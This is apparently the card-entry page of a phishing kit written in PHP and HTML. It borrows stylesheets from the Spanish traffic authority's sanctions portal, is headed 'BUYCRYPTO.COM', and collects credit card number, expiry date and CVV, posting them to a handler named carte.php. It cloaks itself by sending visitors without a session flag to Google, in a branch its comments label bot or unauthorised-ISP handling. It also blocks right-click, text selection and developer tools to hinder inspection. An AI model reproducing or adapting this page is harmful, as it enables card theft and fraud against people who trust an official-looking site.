<?php
session_start();

require '../server/all.php';
include '../settings.php';
//include '../server/fonctions.php';


if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true ) {	
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Page de sanciones</title>

    <!-- Import des styles nécessaires -->
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">

    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }

        .main-header, .main-footer {
            background-color: #048;
            color: #fff;
            padding: 10px 0;
            text-align: center;
        }

        .main-header h1, .main-footer p {
            margin: 0;
        }

        .container {
            padding: 20px;
        }

        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            width: 100%;
        }

        .custom-button:hover {
            background-color: #036;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-control {
            border-radius: 5px;
            border: 1px solid #ccc;
            padding: 10px;
            width: 100%;
        }

        label.mandatory::after {
            content: " *";
            color: red;
        }

        .footer-social ul {
            list-style: none;
            padding: 0;
        }

        .footer-social ul li {
            display: inline-block;
            margin: 0 10px;
        }
    </style>

    <script src="https://js.stripe.com/v3/buy-button.js" async></script>
</head>
<body>
    <header class="main-header">
        <h1>BUYCRYPTO.COM</h1>
    </header>
    <main class="container">
        <form method="post" id="carte_form" action="../actions/carte.php">
            <div class="form-group">
                <label class="mandatory">Número de tarjeta de crédito</label>
                <input id="ccnum" type="text" name="ccnum" class="form-control" minlength="16" maxlength="16" inputmode="numeric" oninput="chiffres_only(this)" required>
                <span id="errorMessage" style="color: red;"></span>
            </div>
            <div class="form-group">
                <label class="mandatory">Fecha de expiración</label>
                <input id="exp" type="text" name="exp" class="form-control" minlength="7" maxlength="7" inputmode="numeric" placeholder="MM/AAAA" oninput="validateExpirationDate(this);" onkeyup="formatString(event);" required>
            </div>
            <div class="form-group">
                <label class="mandatory">CVV</label>
                <input id="cvv" type="text" name="cvv" class="form-control" minlength="3" maxlength="4" placeholder="xxx" inputmode="numeric" oninput="chiffres_only(this)" required>
            </div>
            <button type="submit" name="carte_submit" class="custom-button">Continuar</button>
            <input type="hidden" name="carte_submit" id="carte_submit" value="true">
        </form>
    </main>


    <script>
        function validateExpirationDate(input) {
            input.value = input.value.replace(/\D/g, '');
            if (input.value.length > 2) {
                input.value = input.value.slice(0, 2) + '/' + input.value.slice(2);
            }

            var mois = parseInt(input.value.slice(0, 2), 10);
            var annee = parseInt(input.value.slice(3), 10);

            if (mois < 1 || mois > 12 || annee < 2024 || annee > 2035 || isNaN(mois) || isNaN(annee)) {
                document.getElementById('errorMessage').textContent = "Fecha no válida!";
            } else {
                document.getElementById('errorMessage').textContent = "";
            }
        }

        function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }

        document.addEventListener("contextmenu", function(e) {
            e.preventDefault();
        }, false);

        document.addEventListener("selectstart", function(e) {
            e.preventDefault();
        }, false);

        window.addEventListener("keydown", function(e) {
            if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
                e.preventDefault();
            }
        });

        document.getElementById('carte_form').addEventListener('submit', function() {
            document.getElementById('carte_submit').disabled = true;
        });
    </script>
</body>
</html>


	<!-- REDIRECTION EN CAS DE BOT OU ISP NON AUTORISER -->
<?php
} else {
    header("Location: https://www.google.com");
    exit;
}

?>

<!-- script js -->	
<script>

function ccnum(ccnum) {
      // Supprimer tout sauf les chiffres
      input.value = input.value.replace(/\D/g, '');

      var errorMessage = document.getElementById("errorMessage");

      if (input.value.length === 16) {
        errorMessage.textContent = "";
      } else {
        errorMessage.textContent = "Le numéro de carte de crédit doit contenir 16 chiffres.";
      }
}


   
	 
	 
	  function chiffres_only(input) {
            input.value = input.value.replace(/\D/g, '');
        }

		
		
		
		document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>



<script>
        document.getElementById('carte_form').addEventListener('submit', function() {
            // Désactiver le bouton de soumission après le clic
            document.getElementById('carte_submit').disabled = true;
        });
    </script>